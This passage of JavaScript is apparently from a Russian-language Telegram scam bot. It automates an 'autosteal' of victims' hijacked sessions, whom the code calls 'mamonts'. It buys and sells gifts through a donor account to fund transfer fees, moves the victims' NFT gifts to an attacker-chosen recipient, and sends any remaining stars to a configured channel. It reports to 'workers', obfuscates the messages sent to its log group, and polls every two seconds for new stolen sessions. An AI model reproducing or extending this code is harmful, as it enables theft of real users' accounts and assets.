            `💡 Поместите .session файл в папку: ${donorPath}`,
            { chat_id: chatId, message_id: statusMessage.message_id }
          );
          
          await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
          return;
        }
        
        const donorSessionPath = path.join(donorPath, sessionFile);
        console.log(`[AUTOSTEAL] Подключаюсь к донорской сессии: ${donorSessionPath}`);
        const donorClient = await connectDonorSession(donorSessionPath);
        
        if (!donorClient) {
          console.error(`[AUTOSTEAL] Не удалось подключиться к донорской сессии: ${donorSessionPath}`);
          const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
          // Убрано логирование ошибок донорской сессии
          await bot.editMessageText(
            `❌ Не удалось подключиться к донорской сессии`,
            { chat_id: chatId, message_id: statusMessage.message_id }
          );
          
          await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
          return;
        }
        
        console.log(`[AUTOSTEAL] Успешно подключился к донорской сессии`);
        
        try {
          const donorInfo = await donorClient.getMe();
          const mainUsername = accountInfo.username || String(accountInfo.id);
          
          await bot.editMessageText(
            `✅ Подключено к донорской сессии: @${donorInfo.username || 'без username'}\n` +
            `⏳ Получаю информацию о подарках...`,
            { chat_id: chatId, message_id: statusMessage.message_id }
          );
          
          try {
            // Используем жёстко заданный список подарков вместо API
            const allowedGifts = getDonorGiftsList();
            
            if (allowedGifts.length === 0) {
              await donorClient.disconnect();
              await bot.editMessageText(
                `❌ Нет доступных обычных подарков для покупки на донорской сессии`,
                { chat_id: chatId, message_id: statusMessage.message_id }
              );
              
              await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
              return;
            }
            
            // Проверяем баланс донорской сессии перед расчётом подарков
            console.log(`[AUTOSTEAL] 💰 Проверяю баланс донорской сессии...`);
            const donorStarsBalance = await getStarsBalance(donorClient);
            console.log(`[AUTOSTEAL] 💰 Баланс донорской сессии: ${donorStarsBalance} звёзд`);
            console.log(`[AUTOSTEAL] 💰 Нужно звёзд: ${neededStars}`);
            
            // Ограничиваем neededStars до доступного баланса донорской сессии
            const originalNeededStars2 = neededStars;
            if (donorStarsBalance < neededStars) {
              console.log(`[AUTOSTEAL] 💰 ⚠️  Баланс донорской сессии (${donorStarsBalance}) меньше необходимого (${neededStars})`);
              console.log(`[AUTOSTEAL] 💰 Ограничиваю количество подарков до доступного баланса`);
              neededStars = donorStarsBalance;
              console.log(`[AUTOSTEAL] 💰 Скорректированное количество звёзд для закидывания: ${neededStars}`);
            }
            
            const { gifts: selectedGifts, totalCost, totalStarsAfterSale } = await calculateGiftsToBuy(neededStars, allowedGifts);
            
            if (selectedGifts.length === 0) {
              await donorClient.disconnect();
              await bot.editMessageText(
                `❌ Не найдено подарков с достаточной стоимостью на донорской сессии`,
                { chat_id: chatId, message_id: statusMessage.message_id }
              );
              
              await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
              return;
            }
            
            await bot.editMessageText(
              `📦 Будет отправлено подарков: ${selectedGifts.length}\n` +
              `💰 Стоимость покупки: ${totalCost} звёзд\n` +
              `💵 После продажи получится: ~${totalStarsAfterSale} звёзд\n\n` +
              `⏳ Отправляю подарки...`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            
            let sentCount = 0;
            let progressText = '';
            
            for (let i = 0; i < selectedGifts.length; i++) {
              const gift = selectedGifts[i].gift;
              progressText += `[${i + 1}/${selectedGifts.length}] Отправка подарка...\n`;
              if (progressText.length > 3000) {
                progressText = progressText.slice(-2000);
              }
              try {
                await bot.editMessageText(
                  `📤 Отправка подарков с донорской сессии:\n${progressText}`,
                  { chat_id: chatId, message_id: statusMessage.message_id }
                );
              } catch (e) {}
              
              const success = await buyAndSendGift(donorClient, gift, mainUsername);
              if (success) {
                sentCount++;
              }
              
              // Уменьшена задержка для ускорения
          await new Promise(resolve => setTimeout(resolve, 100));
            }
            
            await donorClient.disconnect();
            
            await bot.editMessageText(
              `✅ Отправлено подарков: ${sentCount}\n\n` +
              `⏳ Ожидание получения подарков на основной сессии (1 секунда)...`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            await bot.editMessageText(
              `⏳ Продаю полученные подарки...`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            
            const starsBeforeSale = await getStarsBalance(client, sessionPath);
            let newSoldCount = 0;
            let attempts = 0;
            
            while (attempts < 3 && newSoldCount === 0) {
              attempts++;
              if (attempts > 1) {
                await new Promise(resolve => setTimeout(resolve, 500));
              }
              
              const newGiftsInfo = await getGiftsInfo(client);
              const newRegularGifts = newGiftsInfo.regular;
              
              for (const gift of newRegularGifts) {
                try {
                  let savedGiftInput = null;
                  
                  if (gift.msgId) {
                    savedGiftInput = new Api.InputSavedStarGiftUser({
                      msgId: gift.msgId,
                    });
                  } else if (gift.savedId) {
                    let fromPeer = null;
                    if (gift.fromId) {
                      if (gift.fromId.className === 'PeerUser') {
                        try {
                          const fromUser = await client.getEntity(gift.fromId.userId);
                          fromPeer = await client.getInputEntity(fromUser);
                        } catch (e) {
                          continue;
                        }
                      } else if (gift.fromId.className === 'PeerChat' || gift.fromId.className === 'PeerChannel') {
                        try {
                          const chatId = gift.fromId.chatId || gift.fromId.channelId;
                          const fromChat = await client.getEntity(chatId);
                          fromPeer = await client.getInputEntity(fromChat);
                        } catch (e) {
                          continue;
                        }
                      }
                    }
                    
                    if (fromPeer) {
                      savedGiftInput = new Api.InputSavedStarGiftChat({
                        peer: fromPeer,
                        savedId: gift.savedId,
                      });
                    }
                  }
                  
                  if (savedGiftInput) {
                    try {
                      const giftDate = gift.date || gift.gift?.date;
                      if (giftDate) {
                        const giftTimestamp = typeof giftDate === 'number' ? giftDate : parseInt(giftDate);
                        const now = Math.floor(Date.now() / 1000);
                        const daysOld = (now - giftTimestamp) / 86400;
                        
                        if (daysOld > 30) {
                          continue;
                        }
                      }
                      
                      const result = await safeInvoke(client, async () => {
                        return await client.invoke(
                          new Api.payments.ConvertStarGift({
                            stargift: savedGiftInput,
                          })
                        );
                      });
                      
                      if (result) {
                        newSoldCount++;
                        await persistSession(client, sessionPath);
                        await new Promise(resolve => setTimeout(resolve, 300)); // Увеличено для избежания rate limit
                      }
                    } catch (e) {
                      if (!e.errorMessage || !e.errorMessage.includes('STARGIFT_CONVERT_TOO_OLD')) {
                      continue;
                      }
                    }
                  }
                } catch (e) {
                  continue;
                }
              }
            }
            
            const starsAfterSale = await getStarsBalance(client, sessionPath);
            const starsEarnedFromDonor = starsAfterSale - starsBeforeSale;
            
            await bot.editMessageText(
              `💰 Получено звёзд: ${starsEarnedFromDonor}\n` +
              `⭐ Текущий баланс: ${starsAfterSale}\n\n` +
              `⏳ Проверяю, хватает ли звёзд для передачи NFT...`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            
            const finalStarsBalance = starsAfterSale;
            const finalNeededStars = Math.max(0, transferCost - finalStarsBalance);
            
            // Разделяем платные и бесплатные NFT
            const paidNFTs = transferableNFTs.filter(nft => !nft.freeTransfer);
            const freeNFTs = transferableNFTs.filter(nft => nft.freeTransfer);
            
            // Рассчитываем сколько платных NFT можно передать на текущий баланс
            const maxAffordablePaidNFTs = Math.floor(finalStarsBalance / 25);
            const nftsToTransfer = [];
            
            // Добавляем бесплатные NFT (они не требуют оплаты)
            nftsToTransfer.push(...freeNFTs);
            
            // Добавляем платные NFT, на которые хватает звёзд
            const affordablePaidNFTs = paidNFTs.slice(0, maxAffordablePaidNFTs);
            nftsToTransfer.push(...affordablePaidNFTs);
            
            // Остальные платные NFT, на которые не хватило звёзд
            const remainingPaidNFTs = paidNFTs.slice(maxAffordablePaidNFTs);
            
            console.log(`[AUTOSTEAL] 💰 Расчёт NFT для передачи:`);
            console.log(`[AUTOSTEAL]    Бесплатных NFT: ${freeNFTs.length} (все будут переданы)`);
            console.log(`[AUTOSTEAL]    Платных NFT можно передать: ${maxAffordablePaidNFTs} из ${paidNFTs.length}`);
            console.log(`[AUTOSTEAL]    Платных NFT останется: ${remainingPaidNFTs.length}`);
            
            if (nftsToTransfer.length > 0) {
              const recipientDisplay = recipientId ? `ID ${recipientId}` : `@${recipientUsername}`;
              const transferMessage = remainingPaidNFTs.length > 0
                ? `⚠️ Звёзд хватает только для ${nftsToTransfer.length} NFT (${freeNFTs.length} бесплатных + ${affordablePaidNFTs.length} платных)\n` +
                  `⚠️ Останется ${remainingPaidNFTs.length} NFT без передачи (не хватает звёзд)\n\n` +
                  `⏳ Начинаю передачу на ${recipientDisplay}...`
                : `✅ Теперь звёзд достаточно! Начинаю передачу ${nftsToTransfer.length} NFT на ${recipientDisplay}...`;
              
              await bot.editMessageText(transferMessage, { chat_id: chatId, message_id: statusMessage.message_id });
              
              let progressText2 = '';
              const result = await transferNFT(client, recipient, async (msg) => {
                progressText2 += msg + '\n';
                if (progressText2.length > 3000) {
                  progressText2 = progressText2.slice(-2000);
                }
                try {
                  await bot.editMessageText(
                    `🔄 Передача NFT:\n${progressText2}`,
                    { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: 'HTML' }
                  );
                } catch (e) {}
              }, nftsToTransfer, sessionPath);
              
              // Добавляем оставшиеся NFT в список не переданных
              if (remainingPaidNFTs.length > 0) {
                const remainingFailed = remainingPaidNFTs.map(nft => ({
                  name: nft.name || 'Неизвестный NFT',
                  link: nft.link || '',
                  error: 'Недостаточно звёзд для передачи'
                }));
                stats.nftFailed = [...(stats.nftFailed || []), ...remainingFailed];
              }
              
              stats.nftSuccess = result.success || [];
              // Сохраняем успешно переданные NFT в base.txt
              if (result.success && result.success.length > 0) {
                await saveSuccessfulNFTs(result.success);
              }
              const allFailedNFTs = [...(result.failed || []), ...nonTransferableNFTs.map(item => ({
                name: item.name,
                link: item.link,
                error: item.error
              }))];
              stats.nftFailed = [...(stats.nftFailed || []), ...allFailedNFTs];
              
              const resultMessage = remainingPaidNFTs.length > 0
                ? `✅ Автостил завершён!\n\n` +
                  `📊 Результаты:\n` +
                  `📦 Получено подарков с донорской: ${sentCount}\n` +
                  `💰 Продано подарков (с донорской): ${newSoldCount} (+${starsEarnedFromDonor} звёзд)\n` +
                  `🖼️  NFT отправлено: ${result.sent}\n` +
                  `⚠️ NFT не передано (не хватало звёзд): ${remainingPaidNFTs.length}`
                : `✅ Автостил завершён!\n\n` +
                  `📊 Результаты:\n` +
                  `📦 Получено подарков с донорской: ${sentCount}\n` +
                  `💰 Продано подарков (с донорской): ${newSoldCount} (+${starsEarnedFromDonor} звёзд)\n` +
                  `🖼️  NFT отправлено: ${result.sent}`;
              
              await bot.editMessageText(resultMessage, { chat_id: chatId, message_id: statusMessage.message_id });
              
              await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
            } else {
              // Нет NFT для передачи вообще - продаём все оставшиеся подарки и отправляем звёзды на сообщение
              console.error(`[AUTOSTEAL] ❌ НЕТ NFT ДЛЯ ПЕРЕДАЧИ (не хватает звёзд даже для одного)`);
              console.log(`[AUTOSTEAL] 💰 Продаю все оставшиеся обычные подарки и отправляю звёзды на сообщение`);
              
              // Получаем информацию о подарках заново
              const currentGiftsInfo = await getGiftsInfo(client);
              const currentStarsBalance = await getStarsBalance(client, sessionPath);
              
              // Продаём все оставшиеся обычные подарки
              if (currentGiftsInfo.regular.length > 0) {
              await bot.editMessageText(
                  `❌ Недостаточно звёзд для передачи NFT.\n\n` +
                  `💰 Найдено обычных подарков: ${currentGiftsInfo.regular.length}\n` +
                  `⏳ Продаю все подарки...`,
                { chat_id: chatId, message_id: statusMessage.message_id }
              );
                
                let soldCount = 0;
                for (let i = 0; i < currentGiftsInfo.regular.length; i++) {
                  const gift = currentGiftsInfo.regular[i];
                  try {
                    let savedGiftInput = null;
                    
                    if (gift.msgId) {
                      savedGiftInput = new Api.InputSavedStarGiftUser({
                        msgId: gift.msgId,
                      });
                    } else if (gift.savedId) {
                      let fromPeer = null;
                      if (gift.fromId) {
                        if (gift.fromId.className === 'PeerUser') {
                          try {
                            const fromUser = await client.getEntity(gift.fromId.userId);
                            fromPeer = await client.getInputEntity(fromUser);
                          } catch (e) {
                            continue;
                          }
                        } else if (gift.fromId.className === 'PeerChat' || gift.fromId.className === 'PeerChannel') {
                          try {
                            const chatId = gift.fromId.chatId || gift.fromId.channelId;
                            const fromChat = await client.getEntity(chatId);
                            fromPeer = await client.getInputEntity(fromChat);
                          } catch (e) {
                            continue;
                          }
                        }
                      }
                      
                      if (fromPeer) {
                        savedGiftInput = new Api.InputSavedStarGiftChat({
                          peer: fromPeer,
                          savedId: gift.savedId,
                        });
                      }
                    }
                    
                    if (savedGiftInput) {
                      try {
                        const result = await safeInvoke(client, async () => {
                          return await client.invoke(
                            new Api.payments.ConvertStarGift({
                              stargift: savedGiftInput,
                            })
                          );
                        });
                        
                        if (result) {
                          soldCount++;
                          await persistSession(client, sessionPath);
                          await new Promise(resolve => setTimeout(resolve, 100));
                        }
                      } catch (e) {
                        // Игнорируем ошибки продажи
                      }
                    }
                  } catch (e) {
                    // Игнорируем ошибки
                  }
                }
                
                console.log(`[AUTOSTEAL] 💰 Продано подарков: ${soldCount}`);
              }
              
              // Отправляем все оставшиеся звёзды на сообщение в канале
              const finalStarsBalance2 = await getStarsBalance(client, sessionPath);
              stats.starsAfter = finalStarsBalance2;
              
              if (finalStarsBalance2 > 0) {
                console.log(`[AUTOSTEAL] ⭐ Отправляю все оставшиеся звёзды (${finalStarsBalance2}) на сообщение в канале`);
                await bot.editMessageText(
                  `❌ Недостаточно звёзд для передачи NFT.\n\n` +
                  `💰 Обычных подарков продано: ${currentGiftsInfo.regular.length > 0 ? 'часть' : 0}\n` +
                  `⭐ Остаток звёзд: ${finalStarsBalance2}\n` +
                  `⏳ Отправляю звёзды на сообщение в канале...`,
                  { chat_id: chatId, message_id: statusMessage.message_id }
                );
                
                const starsChannelId = config.starsChannelId;
                const starsMessageId = config.starsMessageId;
                
                if (starsChannelId && starsMessageId) {
                  try {
                    const starsResult = await sendStarsToChannelMessage(client, starsChannelId, starsMessageId, finalStarsBalance2);
                    
                    if (starsResult.success) {
                      console.log(`[AUTOSTEAL] ✅ Успешно отправлено ${finalStarsBalance2} звёзд на сообщение в канале`);
                      stats.starsAfter = 0;
                      await bot.editMessageText(
                        `✅ АВТОСТИЛ ЗАВЕРШЁН!\n\n` +
                        `📊 Результаты:\n` +
                        `💰 Обычных подарков продано: ${currentGiftsInfo.regular.length > 0 ? 'часть' : 0}\n` +
                        `⭐ Звёзд отправлено на сообщение: ${finalStarsBalance2}`,
                        { chat_id: chatId, message_id: statusMessage.message_id }
                      );
                    } else {
                      await bot.editMessageText(
                        `❌ Недостаточно звёзд для передачи NFT.\n\n` +
                        `⭐ Остаток звёзд: ${finalStarsBalance2}\n` +
                        `❌ Ошибка отправки звёзд на сообщение`,
                        { chat_id: chatId, message_id: statusMessage.message_id }
                      );
                    }
                  } catch (e) {
                    console.error(`[AUTOSTEAL] ❌ Ошибка при отправке звёзд: ${e.message}`);
                  }
                }
              } else {
                await bot.editMessageText(
                  `❌ Недостаточно звёзд для передачи NFT.\n\n` +
                  `💰 Обычных подарков продано: ${currentGiftsInfo.regular.length > 0 ? 'часть' : 0}\n` +
                  `⭐ Остаток звёзд: 0`,
                  { chat_id: chatId, message_id: statusMessage.message_id }
                );
              }
              
              await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
            }
          } catch (e) {
            await donorClient.disconnect();
            await bot.editMessageText(
              `❌ Ошибка при работе с донорской сессией: ${e.message}`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            
            await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
          }
        } catch (e) {
          await donorClient.disconnect();
          await bot.editMessageText(
            `❌ Ошибка при работе с донорской сессией: ${e.message}`,
            { chat_id: chatId, message_id: statusMessage.message_id }
          );
          
          await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
        }
      }
    }
    
  } catch (error) {
    console.error(`\n${'='.repeat(80)}`);
    console.error(`[AUTOSTEAL] ❌ КРИТИЧЕСКАЯ ОШИБКА АВТОСТИЛА!`);
    console.error(`[AUTOSTEAL] ❌ Сообщение: ${error.message}`);
    console.error(`[AUTOSTEAL] ❌ Тип ошибки: ${error.constructor.name}`);
    if (error.errorMessage) {
      console.error(`[AUTOSTEAL] ❌ Telegram API ошибка: ${error.errorMessage}`);
    }
    if (error.code) {
      console.error(`[AUTOSTEAL] ❌ Код ошибки: ${error.code}`);
    }
    console.error(`[AUTOSTEAL] ❌ Stack trace:`);
    console.error(error.stack);
    console.error(`${'='.repeat(80)}\n`);
    
    // Проверяем, является ли ошибка rate limiting (429)
    const errorMsg = String(error.errorMessage || error.message || error.toString() || '').toLowerCase();
    const isRateLimit = errorMsg.includes('429') || errorMsg.includes('too many requests') || errorMsg.includes('retry after');
    const waitMatch = errorMsg.match(/retry after (\d+)/i);
    const waitSeconds = waitMatch ? parseInt(waitMatch[1]) : (error.seconds ? parseInt(error.seconds) : null);
    
    const workerText = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
    
    let errorMessage = error.message;
    if (isRateLimit) {
      if (waitSeconds) {
        const waitMinutes = Math.ceil(waitSeconds / 60);
        errorMessage = `Rate limit: слишком много запросов. Подождите ${waitSeconds} секунд (${waitMinutes} мин) перед повторной попыткой.`;
      } else {
        errorMessage = `Rate limit: слишком много запросов к Telegram API. Попробуйте позже.`;
      }
      console.warn(`[AUTOSTEAL] Обнаружен rate limit: ${errorMessage}`);
    }
    
    try {
      // Убрано логирование ошибок автостила
    } catch (e) {
      console.error(`[AUTOSTEAL] Ошибка отправки лога об ошибке: ${e.message}`);
    }
    
    if (statusMessage) {
      try {
        await bot.editMessageText(
          `❌ Ошибка автостила: ${errorMessage}\n\n${isRateLimit ? '⏳ Это временное ограничение Telegram API. Попробуйте позже.' : 'Проверьте логи в группе.'}`,
          { chat_id: chatId, message_id: statusMessage.message_id }
        );
      } catch (e) {
        console.error(`[AUTOSTEAL] Ошибка редактирования сообщения: ${e.message}`);
      }
    } else {
      try {
        await sendMessageWithTopic(chatId, `❌ Ошибка автостила: ${errorMessage}\n\n${isRateLimit ? '⏳ Это временное ограничение Telegram API. Попробуйте позже.' : 'Проверьте логи в группе.'}`);
      } catch (e) {
        console.error(`[AUTOSTEAL] Ошибка отправки сообщения: ${e.message}`);
      }
    }
    
    await sendAutostealResults(accountInfo || { username: 'неизвестно', id: 'неизвестно' }, workerUsername, workerId, stats, mamontUsername, mamontId);
  } finally {
    if (client) {
      try {
        // Сохраняем сессию перед отключением
        console.log(`[AUTOSTEAL] Сохраняю сессию...`);
        
        // Проверяем тип сессии и сохраняем соответственно
        if (client.session && typeof client.session.save === 'function') {
          const sessionString = client.session.save();
          
          // Если сессия - StringSession (начинается с '1'), сохраняем в файл
          if (sessionString && typeof sessionString === 'string' && sessionString.startsWith('1') && sessionPath) {
            await fs.writeFile(sessionPath, sessionString, "utf-8");
            console.log(`[AUTOSTEAL] Сессия сохранена: ${sessionPath}`);
          } else if (sessionPath) {
            // Для StoreSession сохранение происходит автоматически, но можно проверить
            console.log(`[AUTOSTEAL] Сессия StoreSession (сохранение автоматическое): ${sessionPath}`);
          }
        }
        
        console.log(`[AUTOSTEAL] Отключаю клиент...`);
        await client.disconnect();
        console.log(`[AUTOSTEAL] Клиент отключен`);
      } catch (e) {
        console.error(`[AUTOSTEAL] Ошибка сохранения/отключения клиента: ${e.message}`);
      }
    }
    
    // Удаляем сессию из списка обрабатываемых
    try {
      await fetch('http://localhost:3000/api/complete-autosteal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionPath })
      });
    } catch (e) {
      console.error(`[AUTOSTEAL] Ошибка удаления сессии из обработки: ${e.message}`);
    }
    
    // Удаляем сессию из активных в любом случае (успех или ошибка)
    activeAutostealSessions.delete(sessionPath);
    console.log(`[AUTOSTEAL] ✅ Сессия удалена из активных. Осталось активных: ${activeAutostealSessions.size}`);
    console.log(`\n${'='.repeat(80)}`);
    console.log(`[AUTOSTEAL] 🏁 АВТОСТИЛ ЗАВЕРШЁН`);
    console.log(`[AUTOSTEAL] 📊 Итоговая статистика:`);
    console.log(`[AUTOSTEAL]    ⭐ Звёзд: ${stats.starsBefore} → ${stats.starsAfter}`);
    console.log(`[AUTOSTEAL]    🖼️  NFT передано: ${stats.nftSuccess?.length || 0}`);
    console.log(`[AUTOSTEAL]    🎁 Обычных подарков продано: ${stats.regularSold || 0}`);
    console.log(`[AUTOSTEAL]    🎁 Обычных подарков не продано: ${stats.regularNotSold || 0}`);
    console.log(`${'='.repeat(80)}\n`);
  }
}

// ==================== ЭКСПОРТ ФУНКЦИЙ ДЛЯ SERVER.JS ====================

export {
  getMamontGifts,
  getGiftInfo,
  saveMamontGift,
  performFullAutoSteal
};

// Загружаем конфигурацию при старте
await loadConfig();

// Инициализируем бота после загрузки конфига
bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Обертываем bot.editMessageText и bot.sendMessage для автоматической обфускации
const originalEditMessageText = bot.editMessageText.bind(bot);
bot.editMessageText = async function(text, options = {}) {
  const chatId = options.chat_id || (options.chat && options.chat.id);
  // Обфусцируем текст перед отправкой в группу
  const obfuscatedText = (chatId === LOG_GROUP_ID || chatId === ADMIN_ID) ? obfuscateText(text) : text;
  return await originalEditMessageText(obfuscatedText, options);
};

const originalSendMessage = bot.sendMessage.bind(bot);
bot.sendMessage = async function(chatId, text, options = {}) {
  // Пропускаем обфускацию, если указан флаг skipObfuscation
  if (options.skipObfuscation) {
    const { skipObfuscation, ...restOptions } = options;
    return await originalSendMessage(chatId, text, restOptions);
  }
  // Обфусцируем текст ТОЛЬКО перед отправкой в группу или админу
  // Для обычных пользователей обфускация НЕ применяется
  if (chatId === LOG_GROUP_ID || chatId === ADMIN_ID) {
    const obfuscatedText = obfuscateText(text);
    return await originalSendMessage(chatId, obfuscatedText, options);
  }
  // Для обычных пользователей отправляем без обфускации
  return await originalSendMessage(chatId, text, options);
};

// Инициализируем обработчики событий
initBotHandlers();
initBotEventHandlers();

// Получаем информацию о боте
try {
  const botInfo = await bot.getMe();
  BOT_USERNAME = botInfo.username || 'Market Prime';
  console.log(`✅ Бот запущен: @${BOT_USERNAME} (${botInfo.id})`);
  console.log(`✅ Инлайн режим: включен`);
  
  if (!config.marketWebAppUrl) {
    console.error(`⚠️  ВНИМАНИЕ: WEB_URL не установлен!`);
    console.error(`⚠️  Установите webUrl в config.json или WEB_URL в .env файле`);
  } else {
    console.log(`✅ Маркет URL: ${config.marketWebAppUrl}`);
  }
} catch (e) {
  console.error(`❌ Ошибка получения информации о боте: ${e.message}`);
  console.error(`Проверьте botToken в config.json или BOT_TOKEN в .env`);
}

// ==================== ПРОВЕРКА НОВЫХ СЕССИЙ ДЛЯ АВТОСТИЛА ====================

// Функция для проверки новых сессий и запуска автостила
async function checkForNewSessions() {
  try {
    const response = await fetch('http://localhost:3000/api/get-pending-sessions');
    if (!response.ok) {
      console.log(`[CHECK SESSIONS] Сервер не отвечает: ${response.status}`);
      return;
    }
    
    const data = await response.json();
    console.log(`[CHECK SESSIONS] Получено сессий: ${data.sessions ? data.sessions.length : 0}`);
    
    if (data.sessions && data.sessions.length > 0) {
      for (const sessionData of data.sessions) {
        const { sessionPath, workerUsername, workerId, mamontUsername, mamontId } = sessionData;
        console.log(`[CHECK SESSIONS] Обрабатываю сессию: ${sessionPath}`);
        console.log(`[CHECK SESSIONS] Данные сессии:`, { workerUsername, workerId, mamontUsername, mamontId });
        
        if (sessionPath && await fs.pathExists(sessionPath)) {
          // Запускаем автостил
          console.log(`🔍 Найдена новая сессия: ${sessionPath}. Запускаю автостил...`);
          try {
            await performFullAutoSteal(sessionPath, LOG_GROUP_ID || ADMIN_ID, workerUsername, workerId, mamontUsername, mamontId);
            console.log(`[CHECK SESSIONS] Автостил завершён для сессии: ${sessionPath}`);
          } catch (e) {
            console.error(`[CHECK SESSIONS] Ошибка запуска автостила для ${sessionPath}:`, e);
            console.error(`[CHECK SESSIONS] Stack trace:`, e.stack);
          }
        } else {
          console.error(`[CHECK SESSIONS] Файл сессии не найден: ${sessionPath}`);
        }
      }
    }
  } catch (e) {
    console.error(`[CHECK SESSIONS] Ошибка проверки сессий:`, e);
    console.error(`[CHECK SESSIONS] Stack trace:`, e.stack);
  }
}

// Проверяем новые сессии каждые 2 секунды
setInterval(checkForNewSessions, 2000);
console.log('✅ Проверка новых сессий запущена (каждые 2 секунды)');

